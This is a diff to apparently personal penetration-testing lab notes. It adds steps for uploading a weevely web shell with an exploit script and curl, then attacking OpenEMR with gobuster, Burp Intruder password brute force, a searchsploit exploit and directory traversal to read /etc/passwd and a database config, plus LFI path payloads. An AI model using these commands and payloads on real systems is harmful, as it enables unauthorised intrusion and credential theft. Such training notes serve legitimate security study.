@@ -62,9 +62,37 @@
 12. Execute the commands with the injection
 13. Using weevely → password generation allows to protect the file
   - Command → ```weevely generate password ~/Desktop/login.php```
-  - Change the payload previous script with the new file generated
-  - Execute the script
+  - Change the payload previous script with the new file generated (exploit.php, in the variable @uploadfile)
+  - Execute the script → ```php -f exploit.php``. This uploads login.php to the uploads folder in the application
   - Copy the url when accessing
-  - Use it with weevely → ```weevely url password``
+  - Use it with weevely → ```weevely url password```
   - Then you obtain the session
 14. Automate with curl → ```curl -F "Filedata=@./pathtofile.php" url```
+
+### 7.5. OpenEMR directory traversal
+
+1. Use wappalyzer in order to know the web stack is being used
+2. Directory brute force on the url → ```gobuster dir --url [url] --wordlist /usr/share/wordlists/dirb/common.txt -t 20```. (T are the threads)
+  - Check the directories shown in the result
+    - Build
+    - Common
+    - Config
+    - Library
+    - sql
+3. Apply brute force in the login page with the intruder in BS
+  - Put pass as the variable
+  - Use sniper mode
+  - Load the metasploit wordlist, unit_passwords.txt
+  - Identify the one with a different length and redirection
+4. After checking the OpenEMR version, use searchsploit → ```searchsploit openemr```
+5. Copy the one you are using (Authenticated) Arbitrary File Actions
+  - ```/usr/share/exploitdb/exploits/linux/webapps/45202.txt .```
+6. Follow the instructions → pass the parameters and abuse the one that is being printed. Use Burp Suite
+7. Remove content length header. Place the directory traversal in the parameter
+8.  You can directly type the path → ```/etc/passwd```
+  - Check also directory traversal works → ```../../../../../../etc/passwd```
+  - Check resources → ```/var/www/html/sites/default/sqlconf.php```
+
+### 7.6. LFI basics
+
+1. You should be able to go with files located directly in /var/www/html (because it's where files are server) or with directory traversal → ```/var/www/html/phpinfo.php``` or ```../../../../../var/www/html/phpinfo.php```
